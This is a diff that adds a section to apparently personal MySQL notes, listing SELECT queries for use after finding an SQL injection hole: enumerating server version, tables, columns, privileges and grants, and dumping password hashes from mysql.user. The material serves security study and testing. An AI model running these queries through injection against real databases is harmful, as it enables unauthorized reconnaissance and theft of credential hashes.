@@ -145,3 +145,68 @@ These queries create an empty account table with some fields:
       PRIMARY KEY (`uid`),
       UNIQUE KEY `hruid` (`hruid`)
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+
+SQL injection queries
+---------------------
+
+When a SQL injection vulnerability hits an application and makes it possible to
+run arbitrary ``SELECT`` queries, here are some queries that can be used in
+order to gather information about the database.
+
+* Which version is the server running?
+
+    .. code-block:: mysql
+
+        SELECT version();
+
+* What are the available tables?
+
+    .. code-block:: mysql
+
+        SELECT CONCAT(TABLE_CATALOG,':',TABLE_SCHEMA,'.',TABLE_NAME)
+               FROM information_schema.TABLES;
+
+* What are the columns in the tables?
+
+    .. code-block:: mysql
+
+        SELECT CONCAT(TABLE_CATALOG,':',TABLE_SCHEMA,'.',TABLE_NAME,'.',
+                      COLUMN_NAME,'(',DATA_TYPE,', ',COLUMN_TYPE,')')
+               FROM information_schema.COLUMNS;
+
+* What are the privileges visible from the current user?
+
+    .. code-block:: mysql
+
+        SELECT CONCAT(GRANTEE,'=',TABLE_CATALOG,',',
+                      PRIVILEGE_TYPE,IF(IS_GRANTABLE,'_grantable',''))
+               FROM information_schema.USER_PRIVILEGES;
+        SELECT CONCAT(GRANTEE,'=',TABLE_CATALOG,':',
+                      TABLE_SCHEMA,',',
+                      PRIVILEGE_TYPE,IF(IS_GRANTABLE,'_grantable',''))
+               FROM information_schema.SCHEMA_PRIVILEGES;
+        SELECT CONCAT(GRANTEE,'=',TABLE_CATALOG,':',
+                      TABLE_SCHEMA,'.',TABLE_NAME,',',
+                      PRIVILEGE_TYPE,IF(IS_GRANTABLE,'_grantable',''))
+               FROM information_schema.TABLE_PRIVILEGES;
+        SELECT CONCAT(GRANTEE,'=',TABLE_CATALOG,':',
+                      TABLE_SCHEMA,'.',TABLE_NAME,'.',COLUMN_NAME,',',
+                      PRIVILEGE_TYPE,IF(IS_GRANTABLE,'_grantable',''))
+               FROM information_schema.COLUMN_PRIVILEGES;
+
+* Who gave the grants and when?
+
+    .. code-block:: mysql
+
+        SELECT CONCAT(User,'@',Host,':',Db,'.',Table_name,':',Grantor,' ',
+                      Timestamp,' ',Table_priv,' ',Column_priv)
+               FROM mysql.tables_priv;
+
+* What are the password hashes?
+
+    .. code-block:: mysql
+
+        SELECT CONCAT(User,'@',Host,':',Password,
+                      ' (grant=',Grant_priv,',super=',Super_priv,')')
+               FROM mysql.user;
